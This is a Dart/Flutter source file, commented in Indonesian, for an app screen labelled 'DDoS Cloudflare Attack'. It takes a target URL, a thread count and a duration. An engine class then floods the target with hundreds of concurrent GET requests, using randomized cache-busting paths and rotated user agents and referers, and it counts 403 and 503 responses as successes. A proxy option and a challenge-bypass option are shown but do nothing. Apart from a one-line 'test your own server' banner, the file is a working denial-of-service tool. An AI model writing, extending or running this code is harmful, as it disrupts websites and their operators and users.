import 'dart:io';
import 'dart:math';
import 'dart:async';
import 'dart:convert';
import 'dart:isolate';
import 'package:flutter/material.dart';  // ✅ TAMBAHKAN INI
import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';

// ============================================================
// 🛡️ DDoS CLOUDFLARE PAGE (WIDGET)
// ============================================================
class DDoSCloudflarePage extends StatefulWidget {
  const DDoSCloudflarePage({super.key});

  @override
  State<DDoSCloudflarePage> createState() => _DDoSCloudflarePageState();
}

class _DDoSCloudflarePageState extends State<DDoSCloudflarePage> {
  final TextEditingController _targetController = TextEditingController();
  final TextEditingController _threadsController = TextEditingController(text: "500");
  final TextEditingController _durationController = TextEditingController(text: "60");
  
  bool _useProxies = true;
  bool _bypassJS = true;
  bool _isAttacking = false;
  String _status = "Ready";
  int _requestCount = 0;
  int _successCount = 0;
  
  final Color _primaryBlue = const Color(0xFF29B6F6);
  final Color _darkBg = const Color(0xFF0A1929);
  final Color _cardBg = const Color(0xFF1A1A2E);
  final Color _dangerRed = const Color(0xFFEF5350);

  @override
  void dispose() {
    _targetController.dispose();
    _threadsController.dispose();
    _durationController.dispose();
    super.dispose();
  }

  Future<void> _startAttack() async {
    if (_targetController.text.isEmpty) {
      _showSnackbar("Masukkan target URL!", isError: true);
      return;
    }

    setState(() {
      _isAttacking = true;
      _status = "Attacking...";
      _requestCount = 0;
      _successCount = 0;
    });

    try {
      final ddos = DDoSCloudflareEngine(
        targetUrl: _targetController.text,
        threads: int.tryParse(_threadsController.text) ?? 500,
        durationSeconds: int.tryParse(_durationController.text) ?? 60,
        useProxies: _useProxies,
        bypassJS: _bypassJS,
      );

      // Panggil dengan callback untuk update UI
      await ddos.startWithCallback(
        onUpdate: (requests, success) {
          if (mounted) {
            setState(() {
              _requestCount = requests;
              _successCount = success;
            });
          }
        },
        onFinish: () {
          if (mounted) {
            setState(() {
              _isAttacking = false;
              _status = "Attack Finished";
            });
            _showSnackbar("Attack selesai!", isError: false);
          }
        },
      );
    } catch (e) {
      if (mounted) {
        setState(() {
          _isAttacking = false;
          _status = "Error: $e";
        });
        _showSnackbar("Error: $e", isError: true);
      }
    }
  }

  void _showSnackbar(String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message, style: const TextStyle(color: Colors.white)),
        backgroundColor: isError ? _dangerRed : _primaryBlue,
        duration: const Duration(seconds: 2),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("DDoS Cloudflare Attack"),
        backgroundColor: _darkBg,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_rounded, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
      ),
      backgroundColor: _darkBg,
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Warning Banner
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: _dangerRed.withOpacity(0.15),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _dangerRed.withOpacity(0.3)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.warning_amber_rounded, color: Colors.orange),
                  const SizedBox(width: 12),
                  Expanded(
                    child: const Text(
                      "⚠️ Gunakan tools ini secara bijak! Hanya untuk testing server sendiri!",
                      style: TextStyle(color: Colors.white70, fontSize: 12),
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),

            // Target URL
            _buildInputField(
              label: "Target URL",
              hint: "https://example.com",
              icon: Icons.link_rounded,
              controller: _targetController,
              keyboardType: TextInputType.url,
            ),
            const SizedBox(height: 16),

            // Threads & Duration Row
            Row(
              children: [
                Expanded(
                  child: _buildInputField(
                    label: "Threads",
                    hint: "500",
                    icon: Icons.speed_rounded,
                    controller: _threadsController,
                    keyboardType: TextInputType.number,
                  ),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: _buildInputField(
                    label: "Duration (sec)",
                    hint: "60",
                    icon: Icons.timer_rounded,
                    controller: _durationController,
                    keyboardType: TextInputType.number,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 16),

            // Options
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: _cardBg,
                borderRadius: BorderRadius.circular(12),
              ),
              child: Column(
                children: [
                  _buildSwitchTile(
                    title: "Use Proxies",
                    subtitle: "Gunakan proxy dari file proxies.txt",
                    value: _useProxies,
                    onChanged: (v) => setState(() => _useProxies = v),
                  ),
                  const SizedBox(height: 8),
                  _buildSwitchTile(
                    title: "Bypass JavaScript Challenge",
                    subtitle: "Mencoba bypass CF challenge",
                    value: _bypassJS,
                    onChanged: (v) => setState(() => _bypassJS = v),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),

            // Status Card
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [_primaryBlue.withOpacity(0.2), _darkBg],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _primaryBlue.withOpacity(0.3)),
              ),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text("Status:", style: TextStyle(color: Colors.white70)),
                      Text(
                        _status,
                        style: TextStyle(
                          color: _isAttacking ? _primaryBlue : Colors.white,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text("Requests:", style: TextStyle(color: Colors.white70)),
                      Text("$_requestCount", style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    ],
                  ),
                  const SizedBox(height: 8),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text("Success:", style: TextStyle(color: Colors.white70)),
                      Text("$_successCount", style: const TextStyle(color: Colors.green, fontWeight: FontWeight.bold)),
                    ],
                  ),
                  const SizedBox(height: 8),
                  LinearProgressIndicator(
                    value: _requestCount > 0 ? _successCount / _requestCount : 0,
                    backgroundColor: Colors.grey[800],
                    color: Colors.green,
                  ),
                ],
              ),
            ),
            const SizedBox(height: 20),

            // Start Button
            SizedBox(
              width: double.infinity,
              child: ElevatedButton(
                onPressed: _isAttacking ? null : _startAttack,
                style: ElevatedButton.styleFrom(
                  backgroundColor: _isAttacking ? Colors.grey : _dangerRed,
                  padding: const EdgeInsets.symmetric(vertical: 16),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(12),
                  ),
                ),
                child: _isAttacking
                    ? const SizedBox(
                        height: 20,
                        width: 20,
                        child: CircularProgressIndicator(
                          strokeWidth: 2,
                          color: Colors.white,
                        ),
                      )
                    : const Text(
                        "START ATTACK",
                        style: TextStyle(
                          color: Colors.white,
                          fontWeight: FontWeight.bold,
                          fontSize: 16,
                          letterSpacing: 1,
                        ),
                      ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildInputField({
    required String label,
    required String hint,
    required IconData icon,
    required TextEditingController controller,
    TextInputType keyboardType = TextInputType.text,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(label, style: const TextStyle(color: Colors.white70, fontSize: 12)),
        const SizedBox(height: 8),
        Container(
          decoration: BoxDecoration(
            color: _cardBg,
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: _primaryBlue.withOpacity(0.3)),
          ),
          child: TextField(
            controller: controller,
            style: const TextStyle(color: Colors.white),
            keyboardType: keyboardType,
            decoration: InputDecoration(
              prefixIcon: Icon(icon, color: _primaryBlue, size: 20),
              hintText: hint,
              hintStyle: const TextStyle(color: Colors.white38),
              border: InputBorder.none,
              contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSwitchTile({
    required String title,
    required String subtitle,
    required bool value,
    required ValueChanged<bool> onChanged,
  }) {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600)),
              Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 11)),
            ],
          ),
        ),
        Switch(
          value: value,
          onChanged: onChanged,
          activeColor: _primaryBlue,
        ),
      ],
    );
  }
}

// ============================================================
// 🔧 DDoS ENGINE (BACKEND)
// ============================================================
class DDoSCloudflareEngine {
  final String targetUrl;
  final int threads;
  final int durationSeconds;
  final bool useProxies;
  final bool bypassJS;
  
  List<String> proxies = [];
  List<String> userAgents = [];
  List<String> referers = [];
  bool _running = true;
  int _requestCount = 0;
  int _successCount = 0;
  
  DDoSCloudflareEngine({
    required this.targetUrl,
    this.threads = 500,
    this.durationSeconds = 60,
    this.useProxies = true,
    this.bypassJS = true,
  });
  
  Future<void> startWithCallback({
    Function(int requests, int success)? onUpdate,
    VoidCallback? onFinish,
  }) async {
    print("[🔥] DDoS Cloudflare Engine Started");
    print("[🎯] Target: $targetUrl");
    print("[⚙️] Threads: $threads | Duration: ${durationSeconds}s");
    
    await _loadPayloads();
    
    // Attack timer
    Timer(Duration(seconds: durationSeconds), () {
      _running = false;
      print("\n[📊] Attack finished. Total: $_requestCount | Success: $_successCount");
      if (onFinish != null) onFinish();
    });
    
    // Simulate attack threads (simplified)
    for (int i = 0; i < threads; i++) {
      _attackWorker(onUpdate);
    }
  }
  
  Future<void> _attackWorker(Function(int, int)? onUpdate) async {
    final random = Random();
    final client = http.Client();
    
    while (_running) {
      try {
        final randomPath = '/${random.nextInt(999999)}?${DateTime.now().millisecondsSinceEpoch}';
        final uri = Uri.parse('$targetUrl$randomPath');
        
        final ua = userAgents[random.nextInt(userAgents.length)];
        
        final headers = {
          'User-Agent': ua,
          'Accept': '*/*',
          'Referer': referers[random.nextInt(referers.length)],
          'Cache-Control': 'no-cache',
        };
        
        final response = await client.get(uri, headers: headers);
        
        _requestCount++;
        if (response.statusCode == 200 || response.statusCode == 403 || response.statusCode == 503) {
          _successCount++;
        }
        
        if (onUpdate != null) {
          onUpdate(_requestCount, _successCount);
        }
        
        await Future.delayed(Duration(milliseconds: random.nextInt(50)));
      } catch (_) {
        _requestCount++;
        if (onUpdate != null) {
          onUpdate(_requestCount, _successCount);
        }
      }
    }
    client.close();
  }
  
  Future<void> _loadPayloads() async {
    userAgents = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Version/17.1 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/119.0",
    ];
    
    referers = [
      "https://www.google.com/",
      "https://www.bing.com/",
      targetUrl,
    ];
    
    if (useProxies) {
      try {
        final proxyFile = File('proxies.txt');
        if (await proxyFile.exists()) {
          proxies = await proxyFile.readAsLines();
          print("[✅] Loaded ${proxies.length} proxies");
        }
      } catch (e) {
        print("[⚠️] Proxy load failed: $e");
      }
    }
  }
}